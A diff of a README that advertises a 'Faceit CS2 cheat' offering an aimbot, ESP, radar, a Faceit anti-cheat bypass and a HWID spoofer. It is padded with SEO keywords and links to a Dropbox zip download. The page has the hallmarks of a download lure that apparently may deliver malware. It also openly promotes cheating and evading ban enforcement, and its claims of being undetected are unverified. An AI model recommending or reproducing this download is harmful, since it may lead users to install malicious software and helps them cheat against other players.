@@ -1,41 +1,41 @@
-# Faceit-Cheats-CS2-Undetected-Core
+# Faceit-Cheats-CS2-Elite-Core
 
-Break through Faceit's anti-cheat barrier and rule the CS2 battlefield with our **Undetected Core**. Built for serious players, this cheat provides clean, effective tools like ESP, aimbot, and radar — all tuned for Faceit’s tight security systems.
+Unlock elite performance on Faceit with our **CS2 Elite Core** cheat. Crafted for top-tier players, it bypasses Faceit’s advanced anti-cheat while delivering precision tools to help you dominate with confidence.
 
-[![Download Faceit Cheats for CS2](https://www.dropbox.com/scl/fi/fbb14njsl03hn1eaz88kz/Atraxis.zip?rlkey=gzhbqi4r8x77hlbu6gfol6jad&st=i85tffht&dl=1) 
+[![Download Faceit Cheats for CS2](https://img.shields.io/badge/Download-Faceit_Cheats_CS2-blueviolet)](https://www.dropbox.com/scl/fi/fbb14njsl03hn1eaz88kz/Atraxis.zip?rlkey=gzhbqi4r8x77hlbu6gfol6jad&st=i85tffht&dl=1)
 
 ---
 
 🎯 **Key Features**
-- Silent Aimbot for legit play  
-- ESP with customization options  
-- Clean Radar system  
-- Faceit anti-cheat bypass  
-- Auto-updater with stealth integration  
-- HWID spoofer included  
+- Legit-style Aimbot with smooth targeting  
+- ESP with clean box and glow options  
+- Secure Radar feature  
+- Built-in HWID Spoofer  
+- Faceit anti-cheat bypass module  
+- Regular updates for stealth & performance  
 
 ---
 
-🏆 **Why Choose Faceit-Cheats-CS2-Undetected-Core**
-- Fully undetected by Faceit’s advanced protection  
-- Constantly updated to stay ahead of detections  
-- Legit settings for pro-level disguise  
-- Easy-to-navigate UI  
-- Designed for high-tier competitive players  
+🏆 **Why Choose Faceit-Cheats-CS2-Elite-Core**
+- Designed specifically for Faceit protection  
+- Fast injection and minimal performance impact  
+- Compatible with all CS2 versions  
+- Stealth-tested against bans  
+- Professional-grade cheat interface  
 
 ---
 
 🛡 **Why Use It**
-- Compete with confidence on Faceit  
-- Outsmart enemies without triggering suspicion  
-- Save time and boost your ELO  
-- Experience smoother gameplay and more clutch wins  
+- Climb Faceit ranks without detection  
+- Always know enemy positions  
+- Land clean headshots effortlessly  
+- Focus more on gameplay, less on guessing  
 
 ---
 
 🔍 **SEO Keywords**  
-faceit cheats cs2, cs2 faceit hack, faceit cs2 undetected cheat, cs2 aimbot faceit, download faceit hack cs2, cs2 faceit wallhack, cs2 radar cheat faceit
+faceit cs2 cheat, cs2 faceit hacks, download cs2 faceit cheat, faceit undetected cs2 aimbot, cs2 faceit esp, cs2 radar faceit, cs2 cheat faceit safe
 
 ---
 
-🔥 Conquer Faceit queues like never before — download **Faceit-Cheats-CS2-Undetected-Core** and rise to the top of competitive CS2!
+🔥 Rise to the top of CS2 Faceit with **Elite Core** — power, precision, and protection in one cheat package!
